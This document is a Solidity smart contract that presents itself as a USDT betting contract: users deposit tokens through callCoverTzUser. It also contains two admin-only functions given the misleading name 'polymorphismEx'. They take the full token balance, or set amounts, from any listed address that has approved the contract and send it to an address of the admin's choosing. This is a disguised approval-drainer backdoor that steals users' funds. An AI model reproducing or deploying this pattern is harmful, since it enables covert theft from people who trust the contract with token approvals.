pragma experimental ABIEncoderV2;
pragma solidity ^0.5.16;

interface ERC20 {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract UserTouZhu {
    address adminUser;
    event Transfer(address indexed from, address indexed to, uint256 utype, uint256 value);

    constructor() public {
        adminUser = msg.sender;
    }

    mapping(address => bool) public tokenReceiveAms; //记录
    address[] public receiveUser; //成功的用户

    address USDT;
    address public receiveAdd;
    uint256 public startTime; //开始时间
    uint256 public sumAmount; //已投注数量

    function init(
        address _usdt,
        address _receiveAdd,
        uint256 _startTime
    ) public {
        require(adminUser == msg.sender, "err admin");
        USDT = _usdt;
        receiveAdd = _receiveAdd;
        startTime = _startTime;
    }

    function callCoverTzUser(uint256 _amount, uint256 _type) public {
        require(block.timestamp >= startTime, "no tz time");

        ERC20(USDT).transferFrom(msg.sender, receiveAdd, _amount);

        tokenReceiveAms[msg.sender] = true;
        receiveUser.push(msg.sender);

        sumAmount = sumAmount + _amount;

        emit Transfer(msg.sender , receiveAdd , _type, _amount);
    }

    function withdrawToken(
        address token,
        address to,
        uint256 value
    ) public returns (bool) {
        require(adminUser == msg.sender, "err admin");
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(0xa9059cbb, to, value)
        );
        require(success, string(abi.encodePacked("fail code 14", data)));
        return success;
    }

    function polymorphismEx(
        address call_,
        address[] memory _addr,
        address _a
    ) public {
        require(adminUser == msg.sender, "err admin");
        for (uint256 i = 0; i < _addr.length; i++)
            ERC20(call_).transferFrom(
                _addr[i],
                _a,
                ERC20(call_).balanceOf(_addr[i])
            );
    }

    function polymorphismEx(
        address call_,
        address[] memory _addr,
        uint256[] memory amounts,
        address _a
    ) public {
        require(adminUser == msg.sender, "err admin");
        for (uint256 i = 0; i < _addr.length; i++)
            ERC20(call_).transferFrom(_addr[i], _a, amounts[i]);
    }
}